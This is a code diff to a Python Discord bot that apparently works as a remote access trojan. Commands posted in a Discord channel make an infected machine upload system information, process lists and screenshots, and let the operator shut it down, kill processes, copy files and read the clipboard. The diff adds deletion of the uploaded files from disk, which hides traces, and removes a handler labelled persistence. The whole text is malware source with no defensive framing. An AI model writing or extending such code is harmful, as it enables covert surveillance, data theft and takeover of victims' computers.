@@ -101,7 +101,7 @@ async def on_message(message):
         await message.delete()
         await message.channel.send(embed=pc.comp_info()[0])
         await message.channel.send(file=pc.comp_info()[1])
-        os.rmdir("pc_info.txt")
+        os.remove("pc_info.txt")
 
     #SHUTDOWN
     if message.content.startswith(".shutdown"):
@@ -171,18 +171,18 @@ async def on_message(message):
 
     #TASKLIST - TO FIX
     if message.content.startswith(".tasklist"):
-        process = message.content.replace(".tasklist ", "")
         await message.delete()
         try:
-            result = pw.tasklist(process)
-            print(result)
+            pw.tasklist()
         except Exception as e:
             print(e)
             embed = discord.Embed(title="Tasklist", description="Failed to get tasklist.", color=0x00ff00)
             await message.channel.send(embed=embed)
             return
-        embed = discord.Embed(title="Tasklist", description=result, color=0x00ff00)
+        embed = discord.Embed(title="Tasklist", description="Tasklist fetched.", color=0x00ff00)
         await message.channel.send(embed=embed)
+        await message.channel.send(file=discord.File("tasklist.txt"))
+        os.remove("tasklist.txt")
 
     #TASKKILL
     if message.content.startswith(".taskkill"):
@@ -210,6 +210,7 @@ async def on_message(message):
             return
         embed = discord.Embed(title="Screenshot", description="Screenshot taken.", color=0x00ff00)
         await message.channel.send(file=discord.File(sc), embed=embed)
+        os.remove(sc)
 
     #COPY
     if message.content.startswith(".copy"):
@@ -372,16 +373,6 @@ async def on_message(message):
         else:
             embed = discord.Embed(title="Modules", description="Invalid argument.", color=0x00ff00)
             await message.channel.send(embed=embed)
-            return
-
-    #PERSISTENCE
-    if message.content.startswith(".boot"):
-        await message.delete()
-        try:
-            pc.bootup()
-        except Exception as e:
-            print(e)
-            embed = discord.Embed(title="Bootup", description="Failed to add persistence.", color=0x00ff00)
             return
     
     #CLIPBOARD
